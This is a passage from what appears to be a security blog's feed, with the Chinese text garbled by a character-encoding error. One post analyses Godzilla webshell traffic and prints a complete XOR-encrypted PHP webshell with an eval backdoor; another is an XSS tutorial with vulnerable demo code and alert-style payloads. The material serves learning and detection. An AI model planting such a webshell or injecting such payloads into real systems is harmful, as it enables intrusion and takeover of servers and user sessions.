ç‰ˆæœ¬ä¿¡æ¯ã€‚</p><p><strong>æµé‡ç‰¹å¾</strong></p><ul><li>User-Agentå­—æ®µï¼ˆå¼±ç‰¹å¾ï¼‰ï¼Œå¦‚æœé‡‡ç”¨é»˜è®¤çš„æƒ…å†µï¼Œä¼šæš´éœ²ä½¿ç”¨çš„jdkä¿¡æ¯ã€‚ä¸è¿‡å“¥æ–¯æ‹‰æ”¯æŒè‡ªå®šä¹‰HTTPå¤´éƒ¨ï¼Œè¿™ä¸ªé»˜è®¤ç‰¹å¾æ˜¯å¯ä»¥å¾ˆå®¹æ˜“å»é™¤çš„ã€‚</li><li>Acceptå­—æ®µï¼ˆå¼±ç‰¹å¾ï¼‰ï¼Œé»˜è®¤æ˜¯Accept:text&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, *; q&#x3D;.2, &#x2F;; q&#x3D;.2ã€‚åŒä¸Šï¼Œè¿™ä¸ªä¹Ÿå¯ä¿®æ”¹ï¼Œåªèƒ½ä½œä¸ºè¾…åŠ©æ£€æµ‹çš„ç‰¹å¾ã€‚</li><li>Cookieä¸­æœ‰ä¸€ä¸ªéå¸¸å…³é”®çš„ç‰¹å¾ï¼Œæœ€åä¼šæœ‰ä¸ªåˆ†å·ã€‚ä¼°è®¡åç»­çš„ç‰ˆæœ¬ä¼šä¿®å¤ã€‚</li><li>å“åº”ä½“çš„æ•°æ®æœ‰ä¸€å®šç‰¹å¾ï¼Œå“¥æ–¯æ‹‰ä¼šæŠŠä¸€ä¸ª32ä½çš„md5å­—ç¬¦ä¸²æŒ‰ç…§ä¸€åŠæ‹†åˆ†ï¼Œåˆ†åˆ«æ”¾åœ¨base64ç¼–ç çš„æ•°æ®çš„å‰åä¸¤éƒ¨åˆ†ã€‚æ•´ä¸ªå“åº”åŒ…çš„ç»“æ„ä½“å¾ä¸ºï¼šmd5å‰åå…­ä½+base64+md5ååå…­ä½ã€‚</li></ul><p><strong>æ”»å‡»è¿‡ç¨‹</strong></p><p>å“¥æ–¯æ‹‰å¯ä»¥æŒ‡å®šwebshellè¯­è¨€ã€åŠ å¯†æ–¹å¼ã€å¯†é’¥ã€å¯†ç æ¥ç”Ÿæˆwebshellï¼›ç„¶åå°†webshellä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºè¿æ¥å³å¯ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151450091.png" alt="image-20240502134018866"></p><p>è¿™æ˜¯ç”Ÿæˆçš„å¼‚æˆ–åŠ å¯†çš„è„šæœ¬çš„shell.php</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">session_start</span>();<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;pass&#x27;</span>;<br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;3c6e0b8a9c15224a&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]))&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]),<span class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">0</span>,<span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">16</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>åŠ å¯†è¿‡ç¨‹</strong></p><ol><li>å…ˆå¯¹åŸå§‹æ•°æ®è¿›è¡Œbase64çš„ç¼–ç </li><li>ç„¶åå’Œå¯†é’¥keyæŒ‰ä½å¼‚æˆ–ï¼ˆè¿™ä¸ªå¯†é’¥keyæ˜¯å–shellsettingæ—¶è‡ªå®šä¹‰è®¾ç½®çš„é‚£ä¸ªå¯†é’¥çš„md5å€¼å‰16ä½ã€‚ï¼‰</li><li>å°†å¾—åˆ°çš„æ•°æ®å†base64ä¸€æ¬¡ï¼Œå†urlç¼–ç ä¸€æ¬¡ã€‚</li><li>æœ€åå°†å¾—åˆ°çš„æ•°æ®ä¸å¯†ç è¿›è¡Œæ‹¼æ¥ã€‚</li><li>ç›¸å¯¹åº”çš„åŠ å¯†å‡½æ•°</li></ol><p><strong>çœ‹ä¸€ä¸‹phpçš„æµé‡åŒ…</strong></p><p><img src="http://cdn.clown2024.cn/202407151450092.png" alt="image-20240502133946650"></p><p>å¯ä»¥çœ‹åˆ°cookieåé¢ç¡®å®å¸¦ç€åˆ†å·ï¼Œå¦‚æœè¦è§£å¯†æ•°æ®å°±æŒ‰ç€shell.phpé‡Œé¢ç»™å‡ºçš„è§£å¯†é¡ºåºè§£å‡ºæ¥å³å¯</p><p>å¯¹å„è¯­è¨€çš„shellè¿›è¡Œåˆ†æçš„æ–‡ç« å¯ä»¥çœ‹è¿™ç¯‡ï¼š<a href="https://forum.butian.net/share/2517">https://forum.butian.net/share/2517</a></p>]]></content>
      
      
      <categories>
          
          <category> æµé‡åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æµé‡åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xsså­¦ä¹ </title>
      <link href="/2024/04/29/xss%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/04/29/xss%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="xssç®€ä»‹"><a href="#xssç®€ä»‹" class="headerlink" title="xssç®€ä»‹"></a>xssç®€ä»‹</h1><p>XSSå…¨ç§°ä¸ºCross Site Scriptingï¼Œä¸ºäº†å’ŒCSSåˆ†å¼€ç®€å†™ä¸ºXSSï¼Œä¸­æ–‡åä¸ºè·¨ç«™è„šæœ¬ã€‚è¯¥æ¼æ´å‘ç”Ÿåœ¨ç”¨æˆ·ç«¯ï¼Œæ˜¯æŒ‡åœ¨æ¸²æŸ“è¿‡ç¨‹ä¸­å‘ç”Ÿäº†ä¸åœ¨é¢„æœŸè¿‡ç¨‹ä¸­çš„JavaScriptä»£ç æ‰§è¡Œã€‚XSSé€šå¸¸è¢«ç”¨äºè·å–Cookieã€ä»¥å—æ”»å‡»è€…çš„èº«ä»½è¿›è¡Œæ“ä½œç­‰è¡Œä¸ºã€‚</p><h1 id="xssåˆ†ç±»"><a href="#xssåˆ†ç±»" class="headerlink" title="xssåˆ†ç±»"></a>xssåˆ†ç±»</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://zhuanlan.zhihu.com/p/397940947">https://zhuanlan.zhihu.com/p/397940947</a></p><h2 id="åå°„å‹xss"><a href="#åå°„å‹xss" class="headerlink" title="åå°„å‹xss"></a>åå°„å‹xss</h2><p>åå°„å‹xssçš„æ”»å‡»æµç¨‹ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151445434.webp" alt="img"></p><p>åå°„å‹æ˜¯æ¯”è¾ƒå¸¸è§çš„ï¼Œä»–é€šå¸¸éœ€è¦ç”¨æˆ·ç‚¹å‡»æ”»å‡»è€…åˆ¶ä½œçš„é“¾æ¥æ‰ä¼šè§¦å‘ï¼Œæ¯”å¦‚ä¸€ä¸ªç½‘ç«™æœ‰è¿™æ ·çš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;hello, <span class="hljs-subst">$_GET</span>[&#x27;user&#x27;]&lt;/p&gt;&quot;</span>;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ¶ä½œä¸€ä¸ªurlå¸¦ä¸Šjsä»£ç ç»™ç”¨æˆ·ç‚¹å‡»</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/?user=&lt;/p&gt;&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;&lt;p&gt;<br></code></pre></td></tr></table></figure><p>è¿™æ ·ç”¨æˆ·ç‚¹å‡»è¯¥é“¾æ¥åå°±ä¼šè¿è¡Œjsä»£ç </p><p>è¯¥æ–¹æ³•æ”¶åˆ°Auditorã€NoScriptç­‰é˜²å¾¡æ‰‹æ®µå½±å“è¾ƒå¤§</p><ul><li><p><strong>XSS Auditor</strong>ï¼šXSS Auditor æ˜¯ä¸€äº›ç°ä»£æµè§ˆå™¨å†…ç½®çš„å®‰å…¨ç‰¹æ€§ï¼Œå®ƒèƒ½å¤Ÿæ£€æµ‹å¹¶é˜»æ­¢æŸäº›ç±»å‹çš„XSSæ”»å‡»ã€‚å½“æµè§ˆå™¨è¯†åˆ«åˆ°æŸäº›æ¨¡å¼æˆ–è¡Œä¸ºä¸XSSæ”»å‡»ç›¸ç¬¦æ—¶ï¼ŒXSS Auditor å¯ä»¥è‡ªåŠ¨ä¿®æ”¹æˆ–é˜»æ­¢é¡µé¢çš„åŠ è½½ï¼Œä»è€Œä¿æŠ¤ç”¨æˆ·å…å—æ”»å‡»ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªç½‘ç«™å°†ç”¨æˆ·è¾“å…¥çš„æ•°æ®ç›´æ¥å›æ˜¾åˆ°é¡µé¢ä¸­ï¼Œè€Œæ²¡æœ‰è¿›è¡Œé€‚å½“çš„å¤„ç†ï¼ŒXSS Auditor å¯èƒ½ä¼šä»‹å…¥å¹¶é˜²æ­¢æ¶æ„è„šæœ¬çš„æ‰§è¡Œã€‚</p></li><li><p><strong>NoScript</strong>ï¼š</p><p>NoScript æ˜¯ä¸€ä¸ªæµè§ˆå™¨æ‰©å±•ï¼Œå®ƒå…è®¸ç”¨æˆ·å¯¹ç½‘é¡µä¸Šçš„è„šæœ¬æ‰§è¡Œè¿›è¡Œæ›´ç»†ç²’åº¦çš„æ§åˆ¶ã€‚é€šè¿‡NoScriptï¼Œç”¨æˆ·å¯ä»¥è®¾ç½®è§„åˆ™æ¥ç¦æ­¢æˆ–å…è®¸ç‰¹å®šç½‘ç«™æˆ–è„šæœ¬çš„è¿è¡Œã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼ŒNoScript å¯ä»¥é˜»æ­¢æ‰€æœ‰æœªç»ä¿¡ä»»çš„ç½‘ç«™è¿è¡ŒJavaScriptã€Javaä»¥åŠå…¶ä»–å¯æ‰§è¡Œçš„ä»£ç ã€‚è¿™å¯ä»¥æœ‰æ•ˆåœ°é˜²å¾¡XSS æ”»å‡»ï¼Œå› ä¸ºè®¸å¤šXSS æ”»å‡»ä¾èµ–äºæ¶æ„è„šæœ¬çš„æ‰§è¡Œã€‚</p></li></ul><h2 id="å­˜å‚¨å‹xss"><a href="#å­˜å‚¨å‹xss" class="headerlink" title="å­˜å‚¨å‹xss"></a>å­˜å‚¨å‹xss</h2><p>å­˜å‚¨å‹xssçš„æ”»å‡»æµç¨‹ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151445436.webp" alt="img"></p><p>å­˜å‚¨å‹å°±æ˜¯é»‘å®¢æ”¹å˜äº†å¯¹è±¡ï¼Œç›´æ¥æŠŠå¯¹è±¡å˜ä¸ºæœåŠ¡å™¨äº†ï¼Œå°†æ¶æ„çš„xssè¯­å¥å­˜å…¥æœåŠ¡å™¨ï¼Œè¿™æ ·æ¯æ¬¡ç”¨æˆ·è®¿é—®è¯¥æ­£å¸¸æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨éƒ½ä¼šå°†å¸¦æœ‰æ¶æ„è¯­å¥çš„é¡µé¢ä¸€èµ·è¿”å›ï¼Œè¿™æ ·å°±å¯ä»¥é€ æˆæŒä¹…åŒ–æ”»å‡»ã€‚</p><p>åœ¨ä¸€äº›ç”¨æˆ·ç•™è¨€çš„åŠŸèƒ½å°±å¾ˆå®¹æ˜“å‘ç”Ÿè¿™ç±»xssã€‚</p><h2 id="domå‹xss"><a href="#DOMå‹xss" class="headerlink" title="DOMå‹xss"></a>DOMå‹xss</h2><p>DOMå‹XSSä¸åŒä¹‹å¤„åœ¨äºDOMå‹XSSä¸€èˆ¬å’ŒæœåŠ¡å™¨çš„è§£æå“åº”æ²¡æœ‰ç›´æ¥å…³ç³»ï¼Œè€Œæ˜¯åœ¨JavaScriptè„šæœ¬åŠ¨æ€æ‰§è¡Œçš„è¿‡ç¨‹ä¸­äº§ç”Ÿçš„ã€‚</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>DOM Based XSS Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">xsstest</span>(<span class="hljs-params"></span>)</span><br><span class="language-javascript">&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> str = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;input&quot;</span>).<span class="hljs-property">value</span>;</span><br><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;output&quot;</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">&quot;&lt;img src=&#x27;&quot;</span>+str+<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;output&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;input&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">50</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;xsstest()&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å…¥ <code>x&#39; onerror=&#39;javascript:alert(/xss/)</code> å³å¯è§¦å‘ã€‚</p><p>DOMæŒ‡çš„æ˜¯æ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼ˆDocument Object Model)ï¼Œè¿™æ˜¯ä¸€ç§ç¼–ç¨‹æ¥å£ï¼Œç”¨äºå¤„ç†å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆXMLï¼‰å’Œè¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ï¼ˆHTMLï¼‰æ–‡æ¡£ã€‚é€šè¿‡DOMï¼Œç¨‹åºå‘˜å¯ä»¥åŠ¨æ€åœ°è®¿é—®å’Œæ›´æ–°æ–‡æ¡£çš„å†…å®¹ã€ç»“æ„å’Œæ ·å¼ã€‚</p><p>åœ¨Webå¼€å‘ä¸­ï¼ŒDOMç”¨äºWebæµè§ˆå™¨å’ŒæœåŠ¡å™¨ç«¯çš„è„šæœ¬è¯­è¨€ï¼ˆå¦‚JavaScriptï¼‰æ¥æ“ä½œWebé¡µé¢ã€‚</p><p>æ¯”å¦‚ä¸Šæ–‡çš„document.getElementByIdå°±æ˜¯åˆ©ç”¨DOMæ¥è¿›è¡Œwebé¡µé¢çš„ä¿®æ”¹ã€‚</p><h2 id="blind-xss"><a href="#Blind-XSS" class="headerlink" title="Blind XSS"></a>Blind XSS</h2><p>Blind XSSæ˜¯å‚¨å­˜å‹XSSçš„ä¸€ç§ï¼Œå®ƒä¿å­˜åœ¨æŸäº›å­˜å‚¨ä¸­ï¼Œå½“ä¸€ä¸ªâ€œå—å®³è€…â€è®¿é—®è¿™ä¸ªé¡µé¢æ—¶æ‰§è¡Œï¼Œå¹¶ä¸”åœ¨æ–‡æ¡£å¯¹è±¡æ¨¡å‹(DOM)ä¸­å‘ˆç°payloadã€‚</p><p>ä½†Blind XSSä¸åŒçš„æ˜¯ï¼Œè¯¥xssç±»ä¼¼ç›²æ‰“ï¼Œå³æ”»å‡»è€…ä¸çŸ¥é“è¿™äº›payloadä¼šåœ¨ä½•æ—¶ä½•åœ°æ‰§è¡Œï¼Œä¸ä¸€å®šèƒ½åŠæ—¶å¾—åˆ°å›æ˜¾ã€‚</p><h1 id="xsså±å®³"><a href="#XSSå±å®³" class="headerlink" title="XSSå±å®³"></a>XSSå±å®³</h1><p>XSSå¯ä»¥å¯¼è‡´ä¸‹åˆ—çš„æƒ…å†µï¼š</p><ol><li><p>ç”¨æˆ·çš„Cookieè¢«è·å–ï¼Œå…¶ä¸­å¯èƒ½å­˜åœ¨Session IDç­‰æ•æ„Ÿä¿¡æ¯ã€‚è‹¥æœåŠ¡å™¨ç«¯æ²¡æœ‰åšç›¸åº”é˜²æŠ¤ï¼Œæ”»å‡»è€…å¯ç”¨å¯¹åº”Cookieç™»é™†æœåŠ¡å™¨ã€‚</p></li><li><p>æ”»å‡»è€…èƒ½å¤Ÿåœ¨ä¸€å®šé™åº¦å†…è®°å½•ç”¨æˆ·çš„é”®ç›˜è¾“å…¥ï¼Œæ¯”å¦‚åˆ›å»ºé”®ç›˜ç›‘å¬å™¨ç„¶åæ•è·ä¿¡æ¯ä¹‹ååˆ©ç”¨<code>XMLHttpRequest</code>æˆ–<code>fetch</code>ç­‰APIå‘é€HTTPè¯·æ±‚å°†æ•°æ®å‘é€ç»™æ”»å‡»è€…ã€‚</p></li><li><p>æ”»å‡»è€…é€šè¿‡CSRFç­‰æ–¹å¼ä»¥ç”¨æˆ·èº«ä»½æ‰§è¡Œå±é™©æ“ä½œã€‚</p></li><li><p>XSSè •è™«ï¼Œä¾‹å¦‚Samyè •è™«</p><p>XSSè •è™«ä¸éœ€è¦ç”¨æˆ·ä¸‹è½½æˆ–æ‰§è¡Œä»»ä½•æ–‡ä»¶ï¼Œè€Œæ˜¯é€šè¿‡ç”¨æˆ·ä¸ç½‘é¡µçš„äº¤äº’æ¥ä¼ æ’­ï¼Œé€šå¸¸æ˜¯åœ¨ç”¨æˆ·ä¸çŸ¥ä¸è§‰ä¸­è¿›è¡Œçš„ã€‚</p><p>å…¶å·¥ä½œåŸç†é€šå¸¸å¦‚ä¸‹ï¼š</p><ol><li><strong>å¯»æ‰¾æ¼æ´</strong>ï¼šæ”»å‡»è€…å¯»æ‰¾å­˜åœ¨XSSæ¼æ´çš„ç½‘ç«™ï¼Œè¿™äº›æ¼æ´å¯èƒ½å…è®¸æ”»å‡»è€…æ³¨å…¥æ¶æ„è„šæœ¬ã€‚</li><li><strong>æ³¨å…¥è„šæœ¬</strong>ï¼šæ”»å‡»è€…åœ¨ç½‘ç«™ä¸Šæ³¨å…¥æ¶æ„è„šæœ¬ï¼Œè¯¥è„šæœ¬å¯ä»¥æ˜¯è‡ªæˆ‘å¤åˆ¶çš„ï¼Œå³èƒ½å¤Ÿè‡ªåŠ¨å¯»æ‰¾æ–°çš„å—å®³è€…å¹¶ä¼ æ’­è‡ªèº«ã€‚</li><li><strong>ä¼ æ’­æœºåˆ¶</strong>ï¼šæ¶æ„è„šæœ¬ä¼šåœ¨å…¶ä»–ç”¨æˆ·è®¿é—®å—æ„ŸæŸ“çš„é¡µé¢æ—¶æ‰§è¡Œï¼Œåˆ©ç”¨XSSæ¼æ´å°†è‡ªèº«çš„å‰¯æœ¬æ³¨å…¥åˆ°ç”¨æˆ·çš„ä¼šè¯ä¸­ï¼Œæˆ–è€…è¯±ä½¿ç”¨æˆ·ç‚¹å‡»ä¸€ä¸ªæ¶æ„é“¾æ¥ï¼Œä»è€Œåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚</li><li><strong>è‡ªåŠ¨åŒ–æ”»å‡»</strong>ï¼šXSSè •è™«å¯ä»¥è‡ªåŠ¨æ‰§è¡Œå„ç§æ”»å‡»ï¼Œå¦‚å‘é€åƒåœ¾é‚®ä»¶ã€çªƒå–ç”¨æˆ·ä¿¡æ¯ã€ä¼šè¯åŠ«æŒç­‰ã€‚</li><li><strong>éšè—æ€§</strong>ï¼šç”±äºXSSè •è™«ä¸éœ€è¦ç”¨æˆ·çš„ç›´æ¥äº¤äº’ï¼Œå› æ­¤å…·æœ‰å¾ˆé«˜çš„éšè”½æ€§ï¼Œç”¨æˆ·å¯èƒ½åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹å°±æˆä¸ºäº†æ”»å‡»çš„ä¸€éƒ¨åˆ†ã€‚</li></ol></li><li><p>è·å–ç”¨æˆ·æµè§ˆå™¨ä¿¡æ¯ã€‚</p></li><li><p>åˆ©ç”¨XSSæ¼æ´æ‰«æç”¨æˆ·å†…ç½‘ã€‚</p></li></ol><h1 id="åŒæºç­–ç•¥"><a href="#åŒæºç­–ç•¥" class="headerlink" title="åŒæºç­–ç•¥"></a>åŒæºç­–ç•¥</h1><p>åŒæºç­–ç•¥é™åˆ¶äº†ä¸åŒæºä¹‹é—´å¦‚ä½•è¿›è¡Œèµ„æºäº¤äº’ï¼Œæ˜¯ç”¨äºéš”ç¦»æ½œåœ¨æ¶æ„æ–‡ä»¶çš„é‡è¦å®‰å…¨æœºåˆ¶ã€‚ æ˜¯å¦åŒæºç”±URLå†³å®šï¼ŒURLç”±åè®®ã€åŸŸåã€ç«¯å£å’Œè·¯å¾„ç»„æˆï¼Œå¦‚æœä¸¤ä¸ªURLçš„åè®®ã€åŸŸåå’Œç«¯å£ç›¸åŒï¼Œåˆ™è¡¨ç¤ºä»–ä»¬åŒæºã€‚</p><p>è¿™é‡Œç»™å‡ºä¸€ä¸ªä¸<code>http://store.company.com/dir/page.html</code> çš„æºè¿›è¡Œå¯¹æ¯”çš„ç¤ºä¾‹ï¼š</p><table><thead><tr><th align="left">URL</th><th align="left">ç»“æœ</th><th align="left">åŸå› </th></tr></thead><tbody><tr><td align="left"><code>http://store.company.com/dir2/other.html</code></td><td align="left">åŒæº</td><td align="left">åªæœ‰è·¯å¾„ä¸åŒ</td></tr><tr><td align="left"><code>http://store.company.com/dir/inner/another.html</code></td><td align="left">åŒæº</td><td align="left">åªæœ‰è·¯å¾„ä¸åŒ</td></tr><tr><td align="left"><code>https://store.company.com/secure.html</code></td><td align="left">å¤±è´¥</td><td align="left">åè®®ä¸åŒ</td></tr><tr><td align="left"><code>http://store.company.com:81/dir/etc.html</code></td><td align="left">å¤±è´¥</td><td align="left">ç«¯å£ä¸åŒï¼ˆ<code>http://</code> é»˜è®¤ç«¯å£æ˜¯ 80ï¼‰</td></tr><tr><td align="left"><code>http://news.company.com/dir/other.html</code></td><td align="left">å¤±è´¥</td><td align="left">ä¸»æœºä¸åŒ</td></tr></tbody></table><p>æ›´è¯¦ç»†çš„å»çœ‹è¿™ç¯‡æ–‡ç« å°±è¡Œï¼š<a href="https://websec.readthedocs.io/zh/latest/vuln/xss/sop.html">https://websec.readthedocs.io/zh/latest/vuln/xss/sop.html</a></p><h1 id="xsså¸¸è§æ ‡ç­¾"><a href="#XSSå¸¸è§æ ‡ç­¾" class="headerlink" title="XSSå¸¸è§æ ‡ç­¾"></a>XSSå¸¸è§æ ‡ç­¾</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/4067?time__1311=n4+xnD0DyGYQqxmw405+bWveAKP0K5DOD0rWD&u_atoken=b42a306fbbc31a9250e2f52be102914c&u_asession=01Umc-NzPKkpo5Cm1MZjj0PcZ4nYfzcCvQavG2wen-1XOfMhKklOuuynvcweWGuiHedlmHJsN3PcAI060GRB4YZGyPlBJUEqctiaTooWaXr7I&u_asig=05oI5YNvJnnW4ZbDwZ0jTEAnhHy28drN60y8oSj1AbOuy1F8ElkQRrO4HJQuPCGSD0Q0e5pVEDWIy78womJUHgWifdqZwkTyUiRS0RPiHtGMt2I4GcnVJ86Vg6pqUzr-2PiDWKzVeX040qH4eMgNzhdR1jz4r4BWyg3a9qlljGt2Fg2QMxYs6lyXb1lFWKql56RmnJ9pstOf9YSdbDJQ1eO604Hhg04odPKsBvl3o2kOTZgvqaz4fxLsoyCWh3mJ8rckYCQmaGgn_DBT-Jtjpp6GNiUV0VqAGRk9VySpSEqdJ6gx6UxFgdF3ARCQ86jS_u_XR5hatHQVh06VuUZ-D1wA&u_aref=Tmy1B2vaFEZ7hbJejFOIbsVnxnA=">XSSæ€»ç»“ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p>è¿™é‡Œå°±copyä¸€ä¸‹å¸¸ç”¨æ ‡ç­¾ï¼Œè§åˆ°æ–°çš„å°±è¡¥å……è¿›æ¥</p><p><strong><script></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><strong><img></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt;<br></code></pre></td></tr></table></figure><p><strong><input></strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ç«äº‰ç„¦ç‚¹ï¼Œä»è€Œè§¦å‘onbluräº‹ä»¶,å½“å·¦è¾¹çš„æ¡†è¦å¤±å»ç„¦ç‚¹æ—¶å°±ä¼šæ‰§è¡Œxssä»£ç <br>&lt;input onblur=alert(&quot;xss&quot;) 